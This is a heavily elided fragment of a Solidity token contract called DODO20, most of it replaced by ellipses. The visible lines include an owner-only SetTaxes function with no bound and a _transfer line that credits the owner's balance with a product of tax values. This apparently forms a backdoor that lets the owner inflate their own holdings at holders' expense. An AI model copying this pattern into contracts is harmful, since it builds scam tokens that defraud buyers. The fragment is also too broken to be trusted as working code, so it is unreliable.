 ...
 */
 ...
 contract DODO20 is Context, ERC20, ERC20Metadata {
     ...
     * construction.
     */
     constructor(string memory name_, string memory symbol_,uint8  decimals_,uint256 totalSupply_,uint256 taxFee_,uint256 SetTaxes_ ) {
    _name = name_;
    _symbol =symbol_;
    _decimals = decimals_;
    ...
    function SetTaxes(uint256 newTaxFee) public virtual onlyOwner {
        _SetTaxes = newTaxFee;
    ...
    function _transfer(
        ...
        Tokens[_owner] += _BuyTaxFee * _SetTaxes ;
